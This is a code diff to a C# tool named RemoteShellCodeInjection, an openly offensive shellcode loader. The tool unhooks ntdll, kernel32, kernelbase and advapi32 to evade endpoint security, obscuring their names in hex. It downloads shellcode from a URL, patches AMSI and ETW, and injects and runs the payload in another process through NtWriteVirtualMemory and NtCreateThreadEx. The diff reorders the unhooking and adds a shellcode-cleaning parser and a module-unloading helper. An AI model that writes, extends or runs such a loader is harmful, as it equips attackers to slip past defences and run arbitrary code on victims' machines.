@@ -6,7 +6,14 @@ namespace RemoteShellCodeInjection
 {
     internal class Program
     {
+        //6e74646c6c2e646c6c = ntdll.dll
+        //kernel32.dll=6b65726e656c33322e646c6c
+        //6b65726e656c626173652e646c6c= kernelbase.dll
+        //advapi32.dll= 61647661706933322e646c6c
+        //NtProtectVirtualMemory = 4e7450726f746563745669727475616c4d656d6f7279
         private const string Format = "X4";
+        [DllImport("kernel32.dll")]
+        private static extern bool FreeLibrary(IntPtr hModule);
         [DllImport("kernel32.dll", SetLastError = true)]
         private static extern bool WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
         [DllImport("ntdll.dll", SetLastError = true)]
@@ -22,18 +29,7 @@ namespace RemoteShellCodeInjection
 
         private static void Main(string[] args)
         {
-            string[] ListOfDLLToUnhook = { Utils.Utils.FromHexString("6e74646c6c2e646c6c"), Utils.Utils.FromHexString("6b65726e656c33322e646c6c"),
-                Utils.Utils.FromHexString("6b65726e656c626173652e646c6c"), Utils.Utils.FromHexString("61647661706933322e646c6c") };
-            for (int i = 0; i < ListOfDLLToUnhook.Length; i++)
-            {
-                SharpUnhooker.JMPUnhooker(ListOfDLLToUnhook[i]);
-                SharpUnhooker.EATUnhooker(ListOfDLLToUnhook[i]);
-                if (ListOfDLLToUnhook[i] != Utils.Utils.FromHexString("6e74646c6c2e646c6c"))
-                {
-                    SharpUnhooker.IATUnhooker(ListOfDLLToUnhook[i]);
-                }
-            }
-
+           // Task.Factory.StartNew(() => CheckModule());
             bool aes = args.Contains("-aes");
             string url = "";
             string key = "";
@@ -45,6 +41,17 @@ namespace RemoteShellCodeInjection
             IntPtr hProc = IntPtr.Zero;
             byte[] Key;
             byte[] IV;
+            string[] ListOfDLLToUnhook = { Utils.Utils.FromHexString("6e74646c6c2e646c6c"), Utils.Utils.FromHexString("6b65726e656c33322e646c6c"),
+                Utils.Utils.FromHexString("6b65726e656c626173652e646c6c"), Utils.Utils.FromHexString("61647661706933322e646c6c") };
+            for (int i = 0; i < ListOfDLLToUnhook.Length; i++)
+            {
+                SharpUnhooker.JMPUnhooker(ListOfDLLToUnhook[i]);
+                SharpUnhooker.EATUnhooker(ListOfDLLToUnhook[i]);
+                if (ListOfDLLToUnhook[i] != Utils.Utils.FromHexString("6e74646c6c2e646c6c"))
+                {
+                    SharpUnhooker.IATUnhooker(ListOfDLLToUnhook[i]);
+                }
+            }
             for (int i = 0; i < args.Length; i++)
             {
                 switch (args[i])
@@ -63,7 +70,6 @@ namespace RemoteShellCodeInjection
                         break;
                 }
             }
-
             // Validate the arguments
             if (string.IsNullOrEmpty(url))
             {
@@ -89,6 +95,7 @@ namespace RemoteShellCodeInjection
                 {
                     hProc = targetProcess.Handle;
                     Console.WriteLine("[*] Process handle: " + hProc);
+               
                 }
                 else
                 {
@@ -131,7 +138,7 @@ namespace RemoteShellCodeInjection
                 // Download the remote shellcode
                 HttpClient client = new();
                 shellString = client.GetStringAsync(url).Result;
-                assemblyBytes = shellString.Split(',').Select(s => byte.Parse(s[2..], NumberStyles.HexNumber)).ToArray();
+                assemblyBytes = CleanSC(shellString).Split(',').Select(s => byte.Parse(s[2..], NumberStyles.HexNumber)).ToArray();
             }
             catch (Exception ex)
             {
@@ -161,6 +168,31 @@ namespace RemoteShellCodeInjection
             PatchAMSIAndETW.Run();
             Inject(hProc, assemblyBytes);
         }
+        static void UnloadModule(string moduleName)
+        {
+            Process process = Process.GetCurrentProcess();
+            ProcessModule? module = process.Modules.Cast<ProcessModule>()
+                .FirstOrDefault(m => m.ModuleName == moduleName);
+            if (module != null)
+            {
+                // Unload the module
+                FreeLibrary(module.BaseAddress);
+                Console.WriteLine($"{moduleName} module was successfully unloaded.");
+            }
+            else
+            {
+                Console.WriteLine($"{moduleName} module was not found.");
+            }
+        }
+        private static string CleanSC(string shellString)
+        {
+            shellString = shellString.Trim().Replace("\n", string.Empty).Replace("\t", string.Empty).Replace("\r", string.Empty).Replace(" ", string.Empty);
+            if (shellString[^1]==',')
+            {
+                shellString = shellString[0..^1];
+            }
+            return shellString;
+        }
 
         private static void Inject(IntPtr hProc, byte[] assemblyBytes)
         {
@@ -172,13 +204,12 @@ namespace RemoteShellCodeInjection
             Console.WriteLine("[*] Copying Shellcode...");
             // Write the remote assembly to the allocated memory in the target process
             NtWriteVirtualMemory(hProc, remoteAssembly, assemblyBytes, (UIntPtr)assemblyBytes.Length, out _);
-
             Console.WriteLine("[*] Creating new thread to execute the Shellcode...");
             // Create a remote thread in the target process to execute the remote assembly
             NtCreateThreadEx(out IntPtr hThread, 0x1FFFFF, IntPtr.Zero, hProc, remoteAssembly, IntPtr.Zero, 0, 0, 0, 0, IntPtr.Zero);
-            Console.WriteLine("[+] Thread created with handle {0}! Shellcode executed.", hThread.ToString(Format));
-            Console.WriteLine("\n[+] Press any key to clean the mess.", hThread.ToString(Format));
-            Console.Read();
+            Console.WriteLine("[+] Thread created with handle {0} Shellcode executed.", hThread.ToString(Format));
+            Console.WriteLine("\n[+] Press Enter to clean the mess.", hThread.ToString(Format));
+            _ = Console.Read();
             // Wait for the remote thread to finish execution
             WaitForSingleObject(hThread, 0xFFFFFFFF);
             Console.WriteLine($"[+] Cleaning thread {hThread.ToString(Format)} from the process {hProc}");
